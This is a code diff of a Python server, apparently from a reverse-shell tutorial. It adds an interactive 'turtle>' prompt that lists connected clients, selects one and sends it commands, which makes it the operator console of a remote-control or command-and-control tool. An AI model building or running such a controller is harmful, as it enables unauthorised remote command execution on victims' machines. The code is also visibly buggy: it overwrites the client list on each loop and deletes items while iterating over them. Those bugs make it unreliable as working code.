@@ -65,21 +65,38 @@ def accepting_connection():
         except:
             print("Error accepting connections")
 
-def handle_client_connection(conn, address):
-    print("Connection has been established | IP: " + address[0] + " | Port: " + str(address[1]))
-    all_connections.append(conn)
-    all_addresses.append(address)
+# 2nd Thread func - 1) See all clients 2) Select client 3) Send command
+# Interactive prompt for sending commands - shell named turtle
+# turtle>
+# list 0-..
 
-    while True:
+def start_turtle():
+    cmd = input("turtle> ")
+
+    if cmd.lower() == "list":
+        list_connections()
+    elif "select" in cmd.lower():
+        conn = get_target(cmd)
+        if conn is not None:
+            send_target_commands(conn)
+    else:
+        print("Invalid command")
+
+
+# Display all current active connections with the client
+
+def list_connections():
+    results = ""
+
+    for i, conn in enumerate(all_connections):
         try:
-            data = conn.recv(1024)
-            if not data:
-                break
-            print("Received data from " + address[0] + ": " + data.decode("utf-8"))
+            conn.send(str.encode(" "))
+            conn.recv(201480)
         except:
-            break
+            del all_connections[i]
+            del all_addresses[i]
+            continue
 
-    print("Connection closed | IP: " + address[0] + " | Port: " + str(address[1]))
-    conn.close()
-    all_connections.remove(conn)
-    all_addresses.remove(address)
+        results = str(i) + "  " + str(all_addresses[i][0]) + "  " + str(all_addresses[i][1]) + "\n"
+
+    print("----Clients----\n" + results)
